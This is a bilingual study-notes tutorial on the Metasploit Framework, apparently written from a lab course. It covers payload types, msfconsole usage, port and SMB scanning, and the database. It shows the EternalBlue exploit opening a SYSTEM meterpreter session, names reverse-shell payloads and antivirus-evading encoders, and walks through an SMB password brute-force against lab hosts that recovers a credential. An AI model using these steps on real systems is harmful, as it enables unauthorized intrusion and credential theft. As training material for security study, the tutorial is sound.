---
title: "Metasploit"
categories:
  - 技术
  - 教程
tags: [Markdown, Exploitation]
draft: false
sidebar: false
outline: 2
---

# Metasploit

## Exploitation Basics

**Remote Code Execution (RCE)** is a vulnerability that allows an attacker to run arbitrary code on a remote system. If exploited successfully, it often leads to full system compromise.

**Proof of Concept (PoC)** is often a piece of code or an application that is used to demonstrate an idea or theory is possible. Proof of Concepts are often used to demonstrate vulnerabilities.

**Server Message Block (SMB)** is a communication protocol[1] originally developed in 1983 by Barry A. Feigenbaum at IBM[2] and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2. It also provides an authenticated inter-process communication (IPC) mechanism.


## introduction

Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

Metasploit is an open-source penetration testing framework that helps security professionals find and exploit vulnerabilities in computer systems. It includes a database of known vulnerabilities and tools and scripts for exploiting them.

Metasploit has two main versions:

- **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).
- **Metasploit Framework**: The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions.

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

The main components of the Metasploit Framework can be summarized as follows;

- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

<span style="font-size: 23px;">**Main Components of Metasploit**</span>

While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the `msfconsole` command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload.

- **Exploit**: A piece of code that uses a vulnerability present on the target system.
- **Vulnerability**: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
- **Payload**: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

在 Metasploit 中，**payload（有效载荷）** 是指在成功利用目标系统漏洞后，被执行在目标系统上的代码。它决定了攻击者希望在目标主机上实现什么操作，比如获取 shell、添加用户、上传/下载文件、执行命令等。

**简单理解：**
- **Exploit** 负责“打洞”（利用漏洞进入目标）。
- **Payload** 负责“做事”（漏洞利用成功后在目标上执行的具体操作）。

**常见 payload 类型：**
- **Singles（单体载荷）**：一次性完成所有任务的独立 payload。
- **Stagers（分阶段载荷）**：先建立一个小型连接（stager），再下载和执行更大的 payload（stage）。
- **Meterpreter**：Metasploit 内置的高级交互式 shell，功能强大，支持文件操作、抓取密码、屏幕截图等。

**示例：**
- `windows/meterpreter/reverse_tcp`：目标主机反连到攻击者，获得 Meterpreter shell。
- `cmd/unix/reverse_bash`：在 Unix 系统上反弹一个 bash shell。

**总结：**  
Payload 是 Metasploit 框架中实现攻击后续操作的核心组件，通常与 exploit 配合使用。


<span style="font-size: 23px;">**Auxiliary**</span>

Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

<span style="font-size: 23px;">**Encoders**</span>

Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.

Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.

<span style="font-size: 23px;">**Evasion**</span>

While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.

<span style="font-size: 23px;">**Exploits**</span>

Exploits, neatly organized by target system.

<span style="font-size: 23px;">**NOPs**</span>

NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

<span style="font-size: 23px;">**Payloads**</span>

Payloads are codes that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.

Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a "shell". Metasploit offers the ability to send different payloads that can open shells on the target system.

You will see four different directories under payloads: adapters, singles, stagers and stages.

- **Adapters**: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
- **Singles**: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
- **Stagers**: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
- **Stages**: Downloaded by the stager. This will allow you to use larger sized payloads.

Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.

- generic/shell_reverse_tcp
- windows/x64/shell/reverse_tcp

Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.

<span style="font-size: 23px;">**Post**</span>

Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

If you wish to familiarize yourself further with these modules, you can find them under the modules folder of your Metasploit installation. For the AttackBox these are under /opt/metasploit-framework/embedded/framework/modules

## Msfconsole

`msfconsole`

```bash
# ls
msf6 > ls
[*] exec: ls

'=2.5,!=2.5.0,!=2.5.2,!=2.6'   burp.json   CTFBuilder   Desktop   Downloads   Instructions   Pictures   Postman   Rooms   Scripts   snap   thinclient_drives   Tools
# ping
msf6 > ping -c 1 8.8.8.8
[*] exec: ping -c 1 8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=0.640 ms

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.640/0.640/0.640/0.000 ms
# history
```
Msfconsole is managed by context; this means that unless set as a global variable, all parameter settings will be lost if you change the module you have decided to use. In the example below, we have used the ms17_010_eternalblue exploit, and we have set parameters such as `RHOSTS`. If we were to switch to another module (e.g. a port scanner), we would need to set the RHOSTS value again as all changes we have made remained in the context of the ms17_010_eternalblue exploit. 

```bash
# use 使用 use 命令选择要使用的模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
# show options 显示当前加载的模块
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
# show payloads show 命令可用于任何上下文，后跟模块类型（辅助、有效负载、漏洞利用等）以列出可用模块
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
# info 获取模块信息
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# back  leave the context using the back command(使用back命令离开上下文) 
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > 
```

<span style="font-size: 23px;">**Search**</span>

One of the most useful commands in msfconsole is `search`. This command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system. 

```bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 >
```
The output of the `search` command provides an overview of each returned module. You may notice the “name” column already gives more information than just the module name. You can see the type of module (auxiliary, exploit, etc.) and the category of the module (scanner, admin, windows, Unix, etc.). You can use any module returned in a search result with the command use followed by the number at the beginning of the result line. (e.g. `use 0` instead of `use auxiliary/admin/smb/ms17_010_command`)

Another essential piece of information returned is in the “rank” column. Exploits are rated based on their reliability. The table below provides their respective descriptions.


| Ranking         | Description       |
|:-----------------:|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| ExcellentRanking | The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances (WMF Escape()). |
| GreatRanking    | The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address AFTER a version check. |
| GoodRanking     | The exploit has a default target and it is the "common case" for this type of software (English, Windows 7 for a desktop app, 2012 for server, etc). |
| NormalRanking   | The exploit is otherwise reliable, but depends on a specific version and can't (or doesn't) reliably autodect.|
| AverageRanking  | The exploit is generally unreliable or difficult to exploit.|
| LowRanking      | The exploit is nearly impossible to exploit (or under 50% success rate) for common platforms. |
| ManualRanking   | The exploit is unstable or difficult to exploit and is basically a DoS. This ranking is also used when the module has no use unless specifically configured by the user (e.g.: exploit/unix/webapp/php_eval).|

You can direct the search function using keywords such as type and platform.

For example, if we wanted our search results to only include auxiliary modules, we could set the type to auxiliary. The screenshot below shows the output of the search type:auxiliary telnet command.

`msf6 > search type:auxiliary telnet`

## modules

<span style="font-size: 23px;">**Working with modules**</span>

在Metasploit框架中，**模块 (Modules)** 是其核心组成部分，它们是预先编写好的、具有特定功能的脚本或代码片段。Metasploit框架正是通过集成这些模块来实现各种渗透测试任务的。

可以把Metasploit模块理解为一系列“工具箱”里的“工具”，每种工具都有其专门的用途。

<span style="font-size: 23px;">**Metasploit模块的分类**</span>

Metasploit的模块主要分为以下几大类：

1.  **Exploits (漏洞利用模块)**：
    * **作用**：这些模块旨在利用目标系统或应用程序中的已知漏洞，从而获取对目标的控制权。
    * **特点**：每个Exploit通常针对特定的漏洞（例如，`ms17_010_eternalblue` 利用永恒之蓝漏洞）。成功利用后，Exploit会执行一个 **Payload**（下一条会提到）。
    * **示例**：`exploit/windows/smb/ms17_010_eternalblue` (针对Windows SMB服务的永恒之蓝漏洞)

2.  **Payloads (载荷/有效载荷)**：
    * **作用**：Payload 是在成功利用漏洞后，在目标系统上执行的恶意代码。它定义了你希望在目标上完成什么任务，例如获取一个shell、上传文件、执行命令等。
    * **特点**：
        * **独立于Exploit**：Payload 可以与不同的Exploit结合使用，只要Exploit能够将Payload成功传输到目标并执行。
        * **多种类型**：
            * **Singles (单体载荷)**：包含所有功能的独立代码，体积较大，但更稳定。
            * **Stagers (分阶段载荷)**：首先在目标上建立一个小的连接，然后下载更大的 **Stages (阶段载荷)** 来提供更多功能。这种方式可以绕过一些安全检测，并且更灵活。
            * **Meterpreter** 是Metasploit中最强大和灵活的Payload之一，它提供了一个高级的交互式Shell，可以在目标上执行各种后渗透操作。
    * **示例**：`windows/meterpreter/reverse_tcp` (Windows系统的Meterpreter反向TCP连接载荷)

3.  **Auxiliary (辅助模块)**：
    * **作用**：这些模块不直接用于漏洞利用和获取控制权，而是用于执行各种辅助性的任务，例如信息收集、扫描、嗅探、枚举、认证爆破、拒绝服务攻击等。
    * **特点**：它们通常不需要Payload，因为它们的目的不是获取Shell。
    * **示例**：
        * `auxiliary/scanner/portscan/tcp` (TCP端口扫描器)
        * `auxiliary/scanner/smb/smb_version` (SMB服务版本识别)
        * `auxiliary/admin/mssql/mssql_enum` (MSSQL数据库枚举)

4.  **Post (后渗透模块)**：
    * **作用**：这些模块在成功获取对目标系统的控制权（即建立了一个Session）之后使用。它们用于在被攻陷的系统上进行进一步的侦察、权限提升、持久化、收集凭据、枢纽攻击（pivot）等操作。
    * **特点**：它们通常需要一个活动的Session才能运行。
    * **示例**：
        * `post/windows/gather/hashdump` (Windows密码哈希转储)
        * `post/windows/manage/migrate` (进程迁移)

5.  **Encoders (编码器)**：
    * **作用**：用于对Payload进行编码，以避免被防病毒软件（AV）和入侵检测系统（IDS）检测到。
    * **特点**：编码器不会改变Payload的功能，只会改变其在网络传输或内存中的表现形式。然而，编码并非加密，并非总是能绕过所有安全设备。
    * **示例**：`cmd/powershell_base64` (对Powershell命令进行Base64编码)

6.  **Nops (No Operation Generators/空指令生成器)**：
    * **作用**：生成一系列“空操作”指令，通常用于填充缓冲区，以确保Payload能够准确地落在内存中的预期位置，有助于绕过一些防护机制。

<span style="font-size: 23px;">**模块的特点总结**</span>

* **模块化和可扩展性**：Metasploit框架设计为高度模块化，这意味着你可以根据需要加载和卸载不同的模块。这也使得社区和开发者可以轻松地贡献新的模块，保持框架的更新和强大。
* **标准化接口**：所有模块都遵循Metasploit定义的统一接口和选项结构，这使得用户学习和使用不同类型的模块变得相对容易（例如，都有 `show options`、`set` 等命令）。
* **自动化和半自动化**：模块可以自动化许多复杂的渗透测试任务，同时也可以允许用户进行精细的控制和调整。
* **集成性**：不同类型的模块可以协同工作，例如，一个Exploit成功后可以执行一个Payload，然后利用Post模块进行进一步的后渗透操作。
* **信息丰富**：每个模块都包含详细的信息（通过 `info` 命令查看），包括描述、目标系统、可用选项、作者等，方便用户理解和使用。
* **目标多样性**：Metasploit模块涵盖了从操作系统、网络服务、Web应用程序到物联网设备等各种目标和漏洞类型。

总而言之，Metasploit的模块化设计是其成功的关键，它使得Metasploit成为一个功能强大、灵活且持续更新的渗透测试工具。

<span style="font-size: 23px;">**show options**</span>

在Metasploit中，`show options` 命令的作用是**显示当前加载的模块（exploit, payload, auxiliary等）所需要配置的所有选项**。

当你使用 `use` 命令加载了一个模块之后，例如：

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

`show options` 命令会列出一个表格，其中包含以下几列信息：

  * **Name (名称)**：选项的名称，例如 `RHOSTS`、`LHOST`、`RPORT`、`LPORT`、`PAYLOAD` 等。
  * **Current Setting (当前设置)**：该选项当前的值。在设置之前通常是空白或者默认值。
  * **Required (是否必需)**：指示该选项是否是运行模块所必需的。如果为 `yes`，则必须设置它。
  * **Description (描述)**：对该选项的简要说明。

通过 `show options` 命令，你可以清楚地了解当前模块有哪些可配置的参数，以及哪些是必须设置的，这对于正确使用模块进行渗透测试至关重要。

除了 `show options`，还有一些相关的命令可以查看更多选项：

  * `show advanced`：显示模块的**高级选项**，这些选项通常用于更精细的控制，例如超时设置、避免技术等。
  * `show missing`：显示**所有尚未设置的必需选项**。这在当你忘记设置某个必需选项时非常有用。
  * `show payloads`：如果你加载的是一个exploit模块，此命令会显示与当前exploit兼容的所有可用**payloads**。

<span style="font-size: 23px;">**set parameter**</span>

**Often used parameters**:

- **RHOSTS**: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.
- **RPORT**: “Remote port”, the port on the target system the vulnerable application is running on.
- **PAYLOAD**: The payload you will use with the exploit.
- **LHOST**: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
- **LPORT**: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
- **SESSION**: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.

```bash
# 设置rhosts
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.208.126
rhosts => 10.10.208.126

```

**unset**

```bash
# clear any parameter value
unset [parameter]
# clear all set parameters
unset all
```

<span style="font-size: 23px;">**Using modules**</span>

Once all module parameters are set, you can launch the module using the `exploit` command. Metasploit also supports the `run` command, which is an alias created for the exploit command as the word   did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.).

```bash
# The exploit command can be used without any parameters or using the “-z” parameter.
# The exploit -z command will run the exploit and background the session as soon as it opens
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
```

Some modules support the `check` option. This will check if the target system is vulnerable without exploiting it.

<span style="font-size: 23px;">**Sessions**</span>

Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.

```bash
# The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.181.174:4444 -> 10.10.208.126:49207 (10.10.208.126)

# To interact with session
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 

```

You can use the `background` command to background the session prompt and go back to the msfconsole prompt.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```
Alternatively, `CTRL+Z` can be used to background sessions.

## Scanning

<span style="font-size: 23px;">**Port Scanning**</span> 

Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the **search portscan** command.

```bash
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access
```
Port scanning modules will require you to set a few options:

```bash
msf6 > use 5
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in millisec
                                           onds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                           /basics/using-metasploit.html
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds


View the full module info with the info, or info -d command.
```

- **CONCURRENCY**: Number of targets to be scanned simultaneously.
- **PORTS**: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
- **RHOSTS**: Target or target network to be scanned.
- **THREADS**: Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform [Nmap](../cyber/tools.md#nmap) scans from the msfconsole prompt as shown below faster:

```bash
msf6 auxiliary(scanner/portscan/tcp) > nmap -sS 10.10.193.138
[*] exec: nmap -sS 10.10.193.138

Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-21 07:12 BST
Nmap scan report for 10.10.193.138
Host is up (0.00056s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8000/tcp open  http-alt
MAC Address: 02:EE:43:09:94:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```

<span style="font-size: 23px;">**UDP service Identification**</span>

The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the [UDP](../cyber/network.md#udp) (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.

```bash
msf6 > search udp_sweep

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  auxiliary/scanner/discovery/udp_sweep  .                normal  No     UDP Service Sweeper


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/discovery/udp_sweep

msf6 > use 0
msf6 auxiliary(scanner/discovery/udp_sweep) > set rhosts 10.10.193.138
rhosts => 10.10.193.138
msf6 auxiliary(scanner/discovery/udp_sweep) > run
[*] Sending 13 probes to 10.10.193.138->10.10.193.138 (1 hosts)
[*] Discovered NetBIOS on 10.10.193.138:137 (ACME IT SUPPORT:<00>:G :ACME IT SUPPORT:<1e>:G :IP-10-10-193-13:<00>:U :IP-10-10-193-13:<03>:U :IP-10-10-193-13:<20>:U :00:00:00:00:00:00)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

<span style="font-size: 23px;">**SMB Scans**</span>

Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.

```bash
msf6 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.12.229:445      - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) >
```

When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.

<span style="font-size: 23px;">**Q&A**</span>

What is running on port 8000?
```bash
# step1 scan 8000
msf6 > nmap -sS -p 8000 10.10.193.138
[*] exec: nmap -sS -p 8000 10.10.193.138

Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-21 08:01 BST
Nmap scan report for 10.10.193.138
Host is up (0.00015s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 02:EE:43:09:94:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds

# search http_version
msf6 > search http_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/http_version  .                normal  No     HTTP Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/http_version
# use the module use 0
msf6 > use 0
# check which fields need to be set show options
msf6 auxiliary(scanner/http/http_version) > show options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
                                       ics/using-metasploit.html
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host


View the full module info with the info, or info -d command.
# set the required field, set RHOSTS [target IP address] ; set RPORT 8000
msf6 auxiliary(scanner/http/http_version) > set rhosts 10.10.193.138
rhosts => 10.10.193.138
msf6 auxiliary(scanner/http/http_version) > set rport 8000
rport => 8000
# re-check if all fields are set correctly, show options
msf6 auxiliary(scanner/http/http_version) > show options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.193.138    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
                                       ics/using-metasploit.html
   RPORT    8000             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host


View the full module info with the info, or info -d command.
# start the exploit run
msf6 auxiliary(scanner/http/http_version) > run
[+] 10.10.193.138:8000 webfs/1.21 ( 403-Forbidden )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.

```bash
# search smb_login
msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login  .                normal  No     SMB Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login

# then, use the module use 0 and show options tocheck which fields need to be set
msf6 > use 0
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf6 auxiliary(scanner/smb/smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   ANONYMOUS_LOGIN    false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   CreateSession      false            no        Create a new session for every successful login
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted:
                                                  none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                                 sploit/basics/using-metasploit.html
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair pe
                                                 r line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

# set the required field, set RHOSTS [target IP address] ; set SMBUser penny ; set PASS_FILE [file path]
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.10.193.138
rhosts => 10.10.193.138
msf6 auxiliary(scanner/smb/smb_login) > set smbuser penny
smbuser => penny
msf6 auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
pass_file => /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt


# re-check if all fields are set correctly, show options
RHOSTS             10.10.193.138                   yes       The target host(s), see https://docs.metasploit.com/

SMBUser            penny                           no        The username to authenticate as

PASS_FILE      /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt  no        File containing passwords, one pair per line
                                
# start the exploit run
msf6 auxiliary(scanner/smb/smb_login) > run
[+] 10.10.193.138:445     - 10.10.193.138:445 - Success: '.\penny:leo1234'
[-] 10.10.193.138:445     - 10.10.193.138:445 - Could not connect
[-] 10.10.193.138:445     - 10.10.193.138:445 - Could not connect
[-] 10.10.193.138:445     - 10.10.193.138:445 - Could not connect
[*] 10.10.193.138:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.193.138:445     - Bruteforce completed, 1 credential was successful.
[*] 10.10.193.138:445     - You can open an SMB session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed


```

## Database

<span style="font-size: 23px;">**The Metasploit Database**</span>

Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.

```bash
# start the PostgreSQL database
systemctl start postgresql

# running it as the postgres
sudo -u postgres msfdb init

# delete the existing database
sudo -u postgres msfdb delete
```
`msfconsole`

```bash
#  check the database status
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# list available workspaces
msf6 > workspace
* default

# -a 参数添加工作区  -d 参数删除工作区
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme

msf6 > workspace -d tryhackme2
[*] Deleted workspace: tryhackme2
[*] Switched to workspace: default

# list available options for the workspace command
msf6 > workspace -h
```

```bash
#  db_nmap 运行 Nmap 扫描，所有结果都将保存到数据库中
msf6 > db_nmap -sV -p- 10.10.60.230
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-22 01:13 UTC
